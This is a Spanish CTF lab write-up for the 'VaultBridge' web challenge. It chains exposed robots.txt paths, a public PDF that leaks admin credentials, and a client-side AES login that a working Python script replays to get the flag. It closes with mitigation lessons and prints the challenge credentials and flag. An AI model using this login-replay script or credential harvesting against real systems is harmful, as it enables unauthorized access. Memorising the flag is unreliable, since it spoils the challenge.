---
tipo: laboratorio
tags: [ctf, pentraze, web, medium]
Plataforma: "Pentraze CTF"
Categoría: "Web"
Dificultad: "Medium"
Estado: "Completado"
Puntos: "50"
Flag: "PENTRAZE{48d06eb594e069c69e0d32fc0276b49e9917e9bbc380dcc4421ae6dade1da84a}"
actualizado: 2026-09-24
---
- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Medium|Medium]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Estado:** Completado
- **Puntos:** 50

# Writeup - VaultBridge

> [!info] Objetivo
> Obtener la flag mediante el acceso al panel administrativo de VaultBridge Capital.

- **Target:** `http://34.135.253.132:32982`
- **Fecha de inicio del reto:** 18 de septiembre de 2026

## Resumen rápido de la cadena de ataque

1. La enumeración y `robots.txt` revelan un directorio interno de estados de cuenta.
2. `/prensa` documenta la convención `ACC-000xx-legacy.pdf` y la cuenta raíz `ACC-00001`.
3. El PDF `ACC-00001-legacy.pdf` expone el usuario y la contraseña temporal del panel.
4. `/portal/gestion` no usa un POST HTML convencional: `portal-auth.js` construye un payload AES.
5. Se obtiene un nonce fresco, se reproduce el formato `CryptoJS.AES.encrypt` y se envía a `/portal/api/auth`.
6. La API devuelve la flag.

## Vulnerabilidades explotadas

- **Información sensible en `robots.txt`:** una ruta de archivo interno quedó descubrible.
- **Exposición de un documento interno:** el PDF accesible públicamente contenía credenciales operativas.
- **Credenciales expuestas:** el documento entregaba `ops_admin` y una contraseña temporal utilizable.
- **Autenticación con lógica en el cliente:** el navegador recibía la clave compartida y todo el protocolo.
- **Reproducción de [[AES-CBC]]:** el handshake podía reconstruirse fuera del navegador.
- **Ventana de [[Nonce]] y [[Replay Attack]]:** el nonce expiraba, por lo que había que reutilizar uno fresco y no indefinidamente.

La debilidad no fue una fuerza bruta ni una vulnerabilidad aislada: fue una cadena de exposición de información y de confianza indebida en el cliente.

## Paso a paso técnico

### 1. Enumeración inicial

Las rutas públicas encontradas fueron `/`, `/nosotros`, `/estados-cuenta`, `/prensa`, `/legal`, `/admin` y `/static/`. `/admin` existía, pero su login respondía `405 Method Not Allowed` y solo anunciaba `OPTIONS, POST` en la ruta administrativa convencional. Los intentos básicos de [[SQL Injection]] no autenticaron la sesión.

### 2. Lectura de `robots.txt`

```http
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /wp-admin/
Disallow: /old-portal/
Disallow: /internal-tools/
Disallow: /secure-docs/
Disallow: /vault-legacy/
Disallow: /static/statements/int-ops-archive/
Disallow: /.git/
Disallow: /config-backup/
Sitemap: /sitemap.xml
```

La entrada útil fue `/static/statements/int-ops-archive/`.

### 3. Deducción y descarga del PDF

La página `/prensa` explicaba que las cuentas antiguas seguían el bloque `ACC-000xx`, que la cuenta operativa raíz era `ACC-00001` y que los documentos se nombraban:

```text
<NUMERO_DE_CUENTA>-legacy.pdf
```

Por tanto, el archivo buscado era `ACC-00001-legacy.pdf`:

```bash
BASE="http://34.135.253.132:32982"

curl -s "$BASE/static/statements/int-ops-archive/ACC-00001-legacy.pdf" \
  -o /tmp/ACC-00001-legacy.pdf

pdftotext -layout /tmp/ACC-00001-legacy.pdf -
```

El texto extraído contenía:

```text
URL: /portal/gestion
Usuario: ops_admin
Password temporal: e6c1d640dbf4
```

### 4. Análisis del panel y del JavaScript

`/portal/gestion` devolvía un formulario sin `action` tradicional:

```html
<form id="portal-form"></form>
<script src="/static/js/vendor/crypto-js.min.js"></script>
<script src="/static/js/portal-auth.js"></script>
```

Al revisar `portal-auth.js`, el flujo real era:

```javascript
var nonce = card.getAttribute("data-nonce");
var sharedKey = card.getAttribute("data-key");
var timestamp = (Date.now() / 1000).toString();
var raw = [username, password, nonce, timestamp].join("|");
var payload = CryptoJS.AES.encrypt(raw, sharedKey).toString();

fetch("/portal/api/auth", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ payload: payload })
});
```

El HTML entregaba `data-key="vb-portal-handshake-2026"` y un nonce dinámico con `data-ttl="30"`.

### 5. Reproducción del handshake

`CryptoJS.AES.encrypt` usa el formato compatible con OpenSSL: `Salted__`, salt, derivación `EVP_BytesToKey`, AES-CBC y relleno PKCS#7. El siguiente script obtiene un nonce actual y construye el JSON esperado por la API:

```python
#!/usr/bin/env python3
import base64
import os
import time

import requests
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import EVP_BytesToKey
from Crypto.Util.Padding import pad

BASE = "http://34.135.253.132:32982"
USERNAME = "ops_admin"
PASSWORD = "e6c1d640dbf4"


def cryptojs_encrypt(message: str, passphrase: str) -> str:
    """Reproduce CryptoJS.AES.encrypt(message, passphrase)."""
    salt = os.urandom(8)
    key, iv = EVP_BytesToKey(
        passphrase.encode(), salt, key_len=32, iv_len=16
    )
    ciphertext = AES.new(key, AES.MODE_CBC, iv).encrypt(
        pad(message.encode(), AES.block_size)
    )
    return base64.b64encode(b"Salted__" + salt + ciphertext).decode()


def main():
    session = requests.Session()

    # El nonce debe obtenerse inmediatamente antes de usarlo.
    page = session.get(f"{BASE}/portal/gestion", timeout=10)
    page.raise_for_status()
    card = BeautifulSoup(page.text, "html.parser").select_one("#portal-card")
    nonce = card["data-nonce"]
    shared_key = card["data-key"]
    timestamp = str(time.time())

    raw = "|".join([USERNAME, PASSWORD, nonce, timestamp])
    payload = cryptojs_encrypt(raw, shared_key)
    response = session.post(
        f"{BASE}/portal/api/auth",
        json={"payload": payload},
        timeout=10,
    )
    print(response.status_code)
    print(response.text)


if __name__ == "__main__":
    main()
```

Dependencias: `requests`, `beautifulsoup4` y `pycryptodome`.

### 6. Validación del nonce

Un nonce antiguo produjo:

```json
{"error": "nonce_expired", "ok": false}
```

La protección funcionaba, pero solo contra la reutilización indefinida. La combinación válida fue `nonce fresco` + `timestamp actual` + `payload recién generado`. La respuesta exitosa fue:

```json
{"flag": "PENTRAZE{48d06eb594e069c69e0d32fc0276b49e9917e9bbc380dcc4421ae6dade1da84a}", "ok": true}
```

## Flag

```text
PENTRAZE{48d06eb594e069c69e0d32fc0276b49e9917e9bbc380dcc4421ae6dade1da84a}
```

## Lecciones aprendidas y mitigar

- `robots.txt` no es un control de acceso; no debe revelar directorios, copias antiguas ni rutas administrativas.
- Los documentos históricos deben eliminar las credenciales, los tokens y los datos de operación antes de publicarse, o deben quedar en una zona no pública.
- Las contraseñas temporales deben invalidarse después de un uso y rotarse si se exponen.
- La autenticación debe decidir y validar completamente en el servidor; la lógica de cliente es únicamente una interfaz, no una frontera de seguridad.
- No se deben enviar claves simétricas compartidas a cualquier navegador que necesite autenticar a un usuario.
- El nonce debe ser de un solo uso, estar ligado a la sesión y a la operación, y tener una expiración corta.
- Para datos sensibles debe usarse [[AEAD]] o un mecanismo autenticado; [[AES-CBC]] sin MAC no aporta integridad por sí solo.
- Conviene rotar cualquier secreto expuesto y añadir pruebas automatizadas de detección de secretos en JavaScript y archivos estáticos.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🗂️ Categoría: [[CTF - Web]]
- ⬅️ Anterior: [[Writeup - Eco Persistente|Eco Persistente]]
- ➡️ Siguiente: [[Writeup - Pentra CMS|Pentra CMS]]

## Relacionadas

- [[Archivos y rutas ocultas en retos web]] — el mismo patrón de `robots.txt` y archivos recuperables.
- [[Authentication]] — diferencias entre validar una sesión y confiar en lógica de cliente.
- [[Information Disclosure]] — impacto de exponer rutas, documentos y secretos.
